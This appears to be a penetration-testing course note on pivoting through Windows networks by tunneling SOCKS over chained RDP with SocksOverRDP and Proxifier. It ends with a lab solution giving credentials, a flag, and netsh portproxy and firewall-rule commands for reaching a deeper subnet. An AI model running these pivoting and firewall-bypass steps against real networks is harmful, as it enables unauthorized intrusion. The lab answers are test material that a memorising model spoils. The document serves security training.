# 15 — RDP and SOCKS Tunneling with SocksOverRDP

> SocksOverRDP tunnels a SOCKS proxy through an existing RDP connection using Windows Dynamic Virtual Channels (DVC). Useful when you're pivoting through a Windows network with no SSH access — all you need is RDP from hop to hop.

---

## How It Works

```
Attack Host  [xfreerdp → Win10 pivot]
    │
    ▼
Win10 Pivot  [SocksOverRDP-Plugin.dll → SOCKS5 on 127.0.0.1:1080]
    │  RDP connection with DVC tunnel to 172.16.5.19
    ▼
DC / Win19  (172.16.5.19)  [SocksOverRDP-Server.exe — bridges SOCKS into internal net]
    │  SOCKS5 proxy routes traffic further inward
    ▼
172.16.6.155  (deeper internal — reachable via Proxifier on the pivot)
```

**Plugin side (Win10 pivot):** `SocksOverRDP-Plugin.dll` hooks into mstsc.exe via DVC and creates a SOCKS5 listener on `127.0.0.1:1080` on the pivot.

**Server side (Win19/DC):** `SocksOverRDP-Server.exe` runs as Admin and bridges that SOCKS connection into the network the DC can reach.

**Proxifier:** Installed on Win10 pivot — routes mstsc.exe (or any app) through `127.0.0.1:1080`, tunneling all traffic over RDP into the deeper network.

---

## When to Use

- You have RDP access to a Windows pivot but no SSH
- TCP/UDP tunneling tools are blocked or unavailable
- You need to reach a third network that's only reachable from a second-hop Windows host

---

## Required Files

Download to attack host, then transfer to target as needed:

| File | Purpose | Where |
|------|---------|--------|
| `SocksOverRDP-Plugin.dll` | Loads on Win10 pivot — creates SOCKS listener via RDP DVC | GitHub releases |
| `SocksOverRDP-Server.exe` | Runs on second-hop Windows host (Admin) | Same archive |
| `ProxifierPE.zip` / `ProxifierPE.exe` | Routes traffic through SOCKS on Win10 pivot | Proxifier website |

```bash
# Download SocksOverRDP (attack host)
wget https://github.com/nccgroup/SocksOverRDP/releases/latest/download/SocksOverRDP-x64.zip
unzip SocksOverRDP-x64.zip -d SocksOverRDP-x64/
```

---

## Step 1 — Transfer Files to Win10 Pivot

Connect to the Win10 pivot via xfreerdp and drag-drop or use the shared drive:

```bash
xfreerdp /v:PIVOT_IP /u:htb-student /p:'HTB_@cademy_stdnt!' \
  /cert:ignore /dynamic-resolution \
  /drive:share,/home/kali/SocksOverRDP-x64
```

Then on the pivot, copy from `\\tsclient\share\` to the Desktop.

---

## Step 2 — Register Plugin DLL on Win10 Pivot

On Win10 pivot (CMD — no Admin required for regsvr32 with this DLL):

```cmd
cd C:\Users\htb-student\Desktop\SocksOverRDP-x64
regsvr32.exe SocksOverRDP-Plugin.dll
```

A dialog confirms: **"DllRegisterServer in SocksOverRDP-Plugin.dll succeeded."**

---

## Step 3 — RDP from Pivot to Second Hop

On Win10 pivot, open mstsc.exe and connect to `172.16.5.19` as `victor:pass@123`.

On successful connect, SocksOverRDP plugin fires and shows:
```
SocksOverRDP plugin is enabled. Listening on 127.0.0.1:1080
```

The plugin creates the SOCKS5 listener on the **pivot** (Win10), not the DC.

---

## Step 4 — Start SocksOverRDP-Server.exe on the DC

Transfer `SocksOverRDP-Server.exe` to 172.16.5.19 (via the mstsc session or SMB), then run **as Administrator**:

```cmd
SocksOverRDP-Server.exe
```

Output:
```
SocksOverRDP by Balazs Bucsay
Channel opened over RDP.
```

---

## Step 5 — Confirm SOCKS Listener on Pivot

Back on Win10 pivot (CMD):

```cmd
netstat -antb | findstr 1080
```

Expected:
```
TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
```

---

## Step 6 — Configure Proxifier on Win10 Pivot

Transfer `ProxifierPE.exe` to Win10 pivot and run it.

In Proxifier:
1. **Profile → Proxy Servers → Add**
   - Address: `127.0.0.1`
   - Port: `1080`
   - Protocol: SOCKS5
   - Click **OK**
2. **Profile → Proxification Rules → Default** → set to **Proxy SOCKS5 127.0.0.1**

Now all outbound connections from the pivot route through SocksOverRDP → DC → deeper network.

---

## Step 7 — RDP to Deeper Network via Proxifier

On Win10 pivot, open mstsc.exe and connect to `172.16.6.155`.

Proxifier intercepts the connection, routes it through `127.0.0.1:1080` → DVC tunnel → DC → internal.

Proxifier will show the active routed connection:
```
mstsc.exe → 172.16.6.155:3389 [Proxy SOCKS5 127.0.0.1]
```

---

## Performance Tuning (Slow RDP)

When chaining multiple RDP sessions, performance degrades. In mstsc.exe:

**Experience tab → Performance → Modem (56 kbps)**

This disables desktop themes, wallpaper, animations — significantly improves responsiveness.

---

## Full Copy-Pastable Chain

**Attack host — download and transfer:**
```bash
wget https://github.com/nccgroup/SocksOverRDP/releases/latest/download/SocksOverRDP-x64.zip
unzip SocksOverRDP-x64.zip -d ~/SocksOverRDP-x64/

# Connect to pivot with shared folder
xfreerdp /v:PIVOT_IP /u:htb-student /p:'HTB_@cademy_stdnt!' \
  /cert:ignore /dynamic-resolution \
  /drive:share,/root/SocksOverRDP-x64
```

**Win10 pivot (CMD):**
```cmd
:: Copy files from shared drive
xcopy \\tsclient\share\* C:\Users\htb-student\Desktop\SocksOverRDP-x64\ /E /I

:: Register plugin
cd C:\Users\htb-student\Desktop\SocksOverRDP-x64
regsvr32.exe SocksOverRDP-Plugin.dll

:: Open RDP to DC (plugin fires on connect)
mstsc.exe /v:172.16.5.19
:: Login as victor:pass@123 — watch for "Listening on 127.0.0.1:1080" popup
```

**On DC (172.16.5.19) — run as Admin:**
```cmd
:: Transfer SocksOverRDP-Server.exe (via RDP clipboard or SMB)
SocksOverRDP-Server.exe
```

**Back on Win10 pivot:**
```cmd
netstat -antb | findstr 1080
:: Should show TCP 127.0.0.1:1080 LISTENING

:: Run ProxifierPE.exe, configure SOCKS5 127.0.0.1:1080
:: Then open mstsc.exe → 172.16.6.155
```

---

## Triage

| Symptom | Fix |
|---------|-----|
| `regsvr32` fails with access denied | Needs the DLL to be in a non-protected path — copy to Desktop first |
| No "Listening on 127.0.0.1:1080" popup after mstsc connect | Plugin not registered — re-run `regsvr32.exe SocksOverRDP-Plugin.dll` |
| `netstat` shows 1080 but Proxifier can't connect | SocksOverRDP-Server.exe not running on DC, or not running as Admin |
| mstsc to deeper host connects but immediately drops | Proxifier not configured — default rule must be set to proxy, not direct |
| Very slow RDP session | Set Performance to Modem in mstsc.exe Experience tab |
| Can't transfer Server.exe to DC | Use mstsc clipboard paste (copy file in Explorer → paste into RDP session) |

---

## Key Takeaways

1. **DVC-based tunnel — no extra ports needed.** Traffic rides inside the existing RDP connection, bypassing firewalls that block other pivot methods.
2. **Two-component design:** plugin on the first pivot creates the SOCKS listener; server on the second hop bridges it into the inner network.
3. **Proxifier routes any Windows app** through the SOCKS proxy — mstsc, browsers, etc. — without needing proxychains (which is Linux-only).
4. **Plugin fires on mstsc connect** — the SOCKS listener on 127.0.0.1:1080 only appears after establishing the RDP session to the second hop.
5. **Performance degrades through chained RDP** — always set mstsc Experience to Modem when pivoting through multiple hops.

---

## Lab Solution — Section 15 Skills (May 2026)

**Pivot host:** `10.129.x.x` (ACADEMY-PIVOTING-WIN10PIV) — `htb-student : HTB_@cademy_stdnt!`
**Pivot internal IP:** `172.16.5.150`
**Second hop:** `172.16.5.19` (DC) — `victor : pass@123`
**Deep target:** `172.16.6.155`

> Wait 3–5 minutes after spawn before attempting.

### Q1 — Flag from jason's Desktop on 172.16.6.155 → `H0pping@roundwithRDP!`

**Intended path (SocksOverRDP):**

```bash
# 1. Download binaries to attack host
wget https://github.com/nccgroup/SocksOverRDP/releases/latest/download/SocksOverRDP-x64.zip
unzip SocksOverRDP-x64.zip -d ~/SocksOverRDP-x64/
# Also download ProxifierPE.zip separately

# 2. RDP to Win10 pivot with shared folder containing the tools
xfreerdp /v:PIVOT_IP /u:htb-student /p:'HTB_@cademy_stdnt!' \
  /cert:ignore /dynamic-resolution \
  /drive:share,/root/SocksOverRDP-x64
```

```cmd
:: On Win10 pivot — copy files and register plugin
xcopy \\tsclient\share\* C:\Users\htb-student\Desktop\SocksOverRDP-x64\ /E /I
cd C:\Users\htb-student\Desktop\SocksOverRDP-x64
regsvr32.exe SocksOverRDP-Plugin.dll
:: Dialog: "DllRegisterServer in SocksOverRDP-Plugin.dll succeeded"

:: Open RDP to DC — plugin fires automatically
mstsc.exe /v:172.16.5.19
:: Login: victor:pass@123
:: Popup: "SocksOverRDP plugin enabled, listening on 127.0.0.1:1080"
```

```cmd
:: On DC (172.16.5.19) as victor — run SocksOverRDP-Server.exe as Admin
:: (transfer via RDP clipboard/drag-drop from the mstsc session)
SocksOverRDP-Server.exe
:: Output: "Channel opened over RDP"
```

```cmd
:: Back on Win10 pivot — confirm SOCKS listener
netstat -antb | findstr 1080
:: Expected: TCP 127.0.0.1:1080 LISTENING

:: Run ProxifierPE.exe — configure:
::   Profile → Proxy Servers → Add: 127.0.0.1:1080 SOCKS5
::   Profile → Proxification Rules → Default → Proxy SOCKS5

:: Now open mstsc.exe → 172.16.6.155
:: Login: jason:WellConnected123!
:: Read flag:
type C:\Users\jason\Desktop\Flag.txt
```

**Faster path (double netsh portproxy chain — no extra tools):**
```cmd
:: On Win10 pivot (Admin CMD):
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.19
netsh.exe interface portproxy add v4tov4 listenport=8081 listenaddress=0.0.0.0 connectport=8081 connectaddress=172.16.5.19
netsh advfirewall firewall add rule name="pivot8080" protocol=TCP dir=in localport=8080 action=allow
netsh advfirewall firewall add rule name="pivot8081" protocol=TCP dir=in localport=8081 action=allow
```

```bash
# From attack host — RDP to DC via pivot's portproxy
xfreerdp /v:PIVOT_IP:8080 /u:victor /p:'pass@123' /cert:ignore /dynamic-resolution
```

```cmd
:: On DC (Admin CMD):
netsh.exe interface portproxy add v4tov4 listenport=8081 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.6.155
netsh advfirewall firewall add rule name="dc8081" protocol=TCP dir=in localport=8081 action=allow
```

```bash
# From attack host — RDP straight to 172.16.6.155 via double chain
xfreerdp /v:PIVOT_IP:8081 /u:jason /p:'WellConnected123!' /cert:ignore /dynamic-resolution
# type C:\Users\jason\Desktop\Flag.txt
```

**Flag:** `H0pping@roundwithRDP!`

---

## References

- Previous: [14-ICMP_Tunneling_with_SOCKS.md](14-ICMP_Tunneling_with_SOCKS.md)
- Next: [16-SSH_Pivoting_from_Windows.md](16-SSH_Pivoting_from_Windows.md)
- SocksOverRDP GitHub: https://github.com/nccgroup/SocksOverRDP
